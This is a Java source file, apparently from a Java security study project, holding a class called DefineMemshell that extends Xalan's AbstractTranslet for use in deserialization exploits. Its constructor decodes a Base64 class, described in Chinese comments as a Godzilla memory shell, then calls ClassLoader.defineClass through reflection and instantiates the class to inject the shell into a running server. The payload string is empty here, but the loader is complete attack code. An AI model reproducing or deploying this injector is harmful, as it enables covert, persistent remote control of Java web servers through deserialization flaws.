package com.javasec.memshell;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Base64;

public class DefineMemshell extends AbstractTranslet {
    public DefineMemshell() throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException {
        //哥斯拉内存shell的class Base64
        String godzillaMemShellClassBase64 = "";
        //base64 解码
        byte[] classBytes =  Base64.getDecoder().decode(godzillaMemShellClassBase64);
        //获得上下文的ClassLoader
        ClassLoader loader = Thread.currentThread().getContextClassLoader();
        //反射获得defineClass方法 用来定义Class
        Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        //使得defineClass方法可访问
        defineClassMethod.setAccessible(true);
        //调用defineClass方法 从class字节码创建Class
        Class clazz = (Class) defineClassMethod.invoke(loader,classBytes,0,classBytes.length);
        //创建哥斯拉内存shell实例 哥斯拉内存Shell在此处自动注入
        clazz.newInstance();

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    public static void main(String[] args) {

    }

}
